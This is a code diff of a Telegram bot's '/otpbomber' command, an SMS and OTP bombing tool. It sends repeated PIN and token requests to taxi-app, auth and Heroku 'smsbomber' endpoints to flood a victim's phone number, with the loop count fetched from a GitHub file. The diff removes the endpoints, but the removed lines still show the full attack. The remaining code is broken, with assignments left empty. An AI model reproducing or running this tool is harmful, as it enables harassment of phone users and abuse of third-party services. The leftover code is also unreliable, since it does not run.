@@ -96,38 +96,21 @@ async def comantest(bot, message):
 @bot.on_message(filters.command("otpbomber") & filters.private)
 async def boomer(_, message):
 	try:
-		urlurl2="https://raw.githubusercontent.com/DilumBBBandaraxyzlk125/bsms/main/.alive.txt"
+		urlurl2=""
 		x=requests.get(urlurl2)
 		x.raise_for_status()
 		if len(message.command) < 2:
 			return await message.reply_text("🧩 | Provide with a phone number. 😴")
 		m = await message.reply_text(" Booming...‼️ \n━━━━━━━━━━━━━━")
 		query = message.text.split(None, 1)[1] if len(message.command) < 3 else message.text.split(None, 1)[1].replace(" ", "%20")
-		count=int(requests.get("https://raw.githubusercontent.com/DilumBBBandaraxyzlk125/bsms/main/count.txt").text)
-		url4="https://sl-android.herokuapp.com/smsbomber"
-		url5="https://sl-android1.herokuapp.com/smsbomber1"
-		para={
-		'number':query
-		}
-		fluentme="https://fluentme.databoxtech.io/api/auth/auth/token"
-		fluentmepara={"grant":"phone","phone":query,"scope":"app"}
-		url='http://youcab-apps.com/vconnect/passenger/v1/clientPinRequestData_droid.php'
-		deta={
-		'countrycode':'%2B94','mobile':query,'name':'kirisaman','email':''
-		}
-		u='http://app.yogotaxi.com/yogo_apps/passenger/v1/clientPinRequestData_droid.php'
-		b={'countrycode':'94','mobile':query,'name':'saman','email':''}
-		aaa=requests.get(url4,para)
-		fluentmepost=post(fluentme,fluentmepara)
-		zzxxr=await message.reply_text("Successful... ⚠️️")
+		count=int(requests.get("").text)
 		for i in range (0,count):
-			z=requests.get(url5,para)
+			z=
 			zzx=await message.reply_text("Successful... ⚠️️")
-			r=post(u,b)
+			r=
 			zzz=await message.reply_text("Successful... ⚠️️")
-			g=post(url,deta)
+			g=
 			zzzz=await message.reply_text("Successful... ⚠️️")
-		fluentmeposttwo=post(fluentme,fluentmepara)
 		dil = await message.reply_text("   Done ‼️ \n━━━━━━━━━━━━━━")
 	except requests.exceptions.HTTPError as abcz:
 		off=await message.reply_text("Sorry... 💔\n \nThis has been temporarily suspended by the author. ☘️")
